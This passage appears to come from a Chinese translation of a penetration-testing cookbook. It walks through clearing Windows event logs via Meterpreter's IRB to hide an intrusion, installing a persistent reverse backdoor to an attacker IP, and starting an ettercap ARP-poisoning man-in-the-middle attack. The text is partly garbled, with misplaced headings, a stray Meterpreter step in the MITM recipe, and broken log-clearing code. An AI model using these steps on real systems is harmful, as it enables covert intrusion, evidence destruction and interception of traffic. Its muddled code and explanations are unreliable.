  trans: '


    有几种不同的方法可以从受害者机器上收集数据。在本教程中，我们使用了 `Metasploit` 和 `Meterpreter` 键扫描记录按键，但我们也可以轻松地使用
    `Wireshark` 或 `airodump-ng` 来收集数据。


    这里的关键在于探索其他工具，以便你找到最适合完成目标的工具。


    # 清理痕迹


    在本教程中，我们将使用 `Metasploit` 来擦除我们的痕迹。在攻破主机后进行清理是一个极其重要的步骤，因为你不想在费了很大力获取访问权限后却被发现。幸运的是，`Metasploit`
    有一种非常简单的方法让我们清理痕迹。


    ![](img/00173.jpeg)


    # 权限提升


    ## 准备工作


    执行此教程我们需要以下条件：

    - 与互联网或内网的连接

    - 还需要一台使用 `Metasploit` 框架的受控机器


    ### 如何操作...


    要执行的步骤如下：


    1. 让我们从 `Meterpreter` shell 开始清理痕迹的过程。你将必须使用 `Metasploit` 攻击主机以获取 `Meterpreter`
    shell。你可以使用第 6 章“利用漏洞”中的任一个教程，使用 `Metasploit` 访问主机。一旦你使用带有 `Meterpreter` 负载的 `Metasploit`
    漏洞访问了受害者，请等待 `Meterpreter` 提示符显示：


    2. 接下来，我们需要运行 `IRB` 以开始删除日志的过程。我们打开帮助文件：

    ```

    irb

    ```


    3. 接下来，我们告诉 `IRB` 我们想要删除哪些日志。以下是某些可选选项。

    - `log = client.sys.eventlog.open(''system'')`

    - `log = client.sys.eventlog.open(''security'')`

    - `log = client.sys.eventlog.open(''application'')`

    - `log = client.sys.eventlog.open(''directory service'')`

    - `log = client.sys.eventlog.open(''dns server'')`

    - `log = client.sys.eventlog.open(''file replication service'')`


    ![](img/00174.jpeg)


    4. 为了我们的目的，我们将清除所有日志。你必须逐个输入这些命令。

    ```

    log = client.sys.eventlog.open(''system'')

    log = client.sys.eventlog.open(''security'')

    log = client.sys.eventlog.open(''application'')

    log = client.sys.eventlog.open(''directory service'')

    log = client.sys.eventlog.open(''dns server'')

    log = client.sys.eventlog.open(''file replication service'')

    ```


    5. 现在，我们执行命令来删除日志文件：

    ```

    Log.clear

    ```


    6. 大好了！只需几条命令，我们就能够掩盖自己的痕迹了！


    ### 工作原理...


    在本教程中，我们使用 `Meterpreter` 在受控主机上掩盖痕迹。我们从一个 `Meterpreter` shell 开始教程，并启动了 `IRB`（一个
    Ruby 解释器 shell）。接下来，我们精确指定了想要删除哪些文件，并通过发布 `Log.clear` 命令清除日志来结束教程。记住，你希望在攻破主机后最后执行这一步；你不想在掩盖痕迹后又执行另一个功能从而添加更多的日志条目，以此类推。


    # 创建持久化后门


    在本教程中，我们将使用 `Metasploit` 持久化创建一个持久化后门。一旦你成功访问受控机器，你将希望找到无需再次破入就能重新访问机器的方法。如果受控机器的用户执行了某些中断连接的操作（例如重启机器），使用后门将允许连接重新建立到你的机器。这就是创建后门的用武之处，因为它允许你保持对之前被攻破机器的访问权限。


    ## 准备工作


    执行此教程我们需要以下条件：

    - 与互联网或内网的连接

    - 还需要一台使用 `Metasploit` 框架的受控机器


    ![](img/00175.jpeg)


    # 权限提升


    ### 如何操作...


    让我们开始安装持久化后门的过程。你将必须使用 `Metasploit` 攻击主机以获取 `Meterpreter` shell。你可以使用第 6 章“利用漏洞”中的任一个教程，使用
    `Metasploit` 访问主机。


    1. 一旦你使用带有 `Meterpreter` 负载的 `Metasploit` 漏洞访问了受害者，请等待 `Meterpreter` 提示符显示：


    2. 接下来，我们需要运行 `persistence` 来设置我们的后门。我们打开帮助文件：

    ```

    run persistence -h

    ```


    3. `persistence` 后门有很多选项，包括：

    - `-A`: 此选项会自动启动一个多处理器处理器来连接到代理。

    - `-S`: 此选项允许后门作为服务自动启动。

    - `-U`: 此选项允许后门在用户启动时自动启动。

    - `-i`: 此选项设置返回攻击者机器的尝试间隔秒数（秒）。

    - `-p`: 此选项设置 `Metasploit` 在攻击者机器上监听的端口。

    - `-P`: 此选项设置要使用的负载（默认是 `reverse_tcp`，这在中间人攻击中是常用的）。

    - `-r`: 此选项设置攻击者的 IP 地址。


    4. 现在，我们执行命令来设置后门：

    ```

    run persistence -U -i 10 -p 8090 -r 192.168.10.111

    ```


    ![](img/00176.jpeg)


    5. 如果成功，你会看到 `Meterpreter` 会话！


    ### 工作原理...


    在本教程中，我们使用 `Meterpreter` 在受控主机上设置了持久化。我们从一个 `Meterpreter` shell 开始教程，并在入侵后启动了
    `persistence`。接下来，我们通过查看帮助文件探索了某些可用选项。最后，通过运行安装命令完成了设置。


    # 中间人攻击 (MITM)


    在本教程中，我们将对一个目标进行中间人（MITM）攻击。中间人攻击的工作原理允许我们监听目标与其合法方之间的通信。在我们的示例中，我们可以利用 `ettercap`
    监听对 `yahoo.com` 的通信。


    ## 准备工作


    执行此教程我们需要以下条件：

    - 与网络的连接

    - 一台接入网络的机器


    ![](img/00177.jpeg)


    # 权限提升


    ### 如何操作...


    让我们通过启动 `ettercap` 开始中间人攻击。


    1. 打开终端窗口并启动 `ettercap`。使用 `-G` 选项启动图形用户界面（GUI）：

    ```

    ettercap -G

    ```


    2. 我们通过开启统一嗅探开始过程。你可以按下 `Shift+U` 或使用菜单进入 `Sniff|Unified sniffing...`，如下图所示：


    ![](img/00178.jpeg)


    3. 选择网络接口。在使用中间人攻击的情况下，我们应该选择我们的无线接口：


    4. 接下来，我们需要开启主机扫描。这可以通过按下 `Ctrl+S` 或使用菜单进入 `Hosts|Scan for hosts` 完成，如下图所示：


    ![](img/00179.jpeg)


    5. 接下来，我们调出主机列表。你可以按下 `H` 或使用菜单进入 `Hosts|Host List:`：


    6. 接下来，我们需要选择并设置目标。在我们的情况下，通过高亮其 IP 地址并点击 `Add To Target 1` 按钮将 `192.168.10.111`
    设置为目标 1：


    7. 如果成功，你会看到 `Meterpreter` 会话！


    8. 现在，我们能够允许 `ettercap` 开始嗅探。你可以按下 `Ctrl+W` 或使用菜单进入 `Start|Start Sniffing:`：


    9. 最后，我们开始 ARP 毒化过程。从菜单进入 `Mitm|Arp poisoning...`


    ![](img/00180.jpeg)


